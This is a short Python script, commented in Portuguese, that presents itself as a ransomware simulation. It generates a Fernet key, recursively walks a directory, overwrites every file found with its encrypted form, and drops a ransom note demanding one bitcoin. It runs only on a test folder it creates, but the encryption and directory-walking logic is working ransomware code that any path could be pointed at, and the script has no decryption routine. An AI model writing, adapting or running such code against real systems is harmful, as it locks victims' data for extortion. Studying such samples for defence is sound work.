import os
from cryptography.fernet import Fernet

# 1. Gerar e salvar a chave
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    dados_encriptados = f.encrypt(dados)
    
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4. Varrer diretórios (Simulando propagação)
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Evita criptografar o próprio script ou a chave
            if nome != "ransomware_sim.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("⚠️ Seus arquivos foram criptografados!\n")
        f.write("Para recuperar, envie 1 BTC para o endereço: XXXXXXX\n")

def main():
    # Cria pasta de teste se não existir
    if not os.path.exists("test_files"):
        os.makedirs("test_files")
        with open("test_files/teste.txt", "w") as f: f.write("Dados sensíveis")

    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    
    criar_mensagem_resgate()
    print("🚀 Ransomware simulado com sucesso!")

if __name__ == "__main__":
    main()
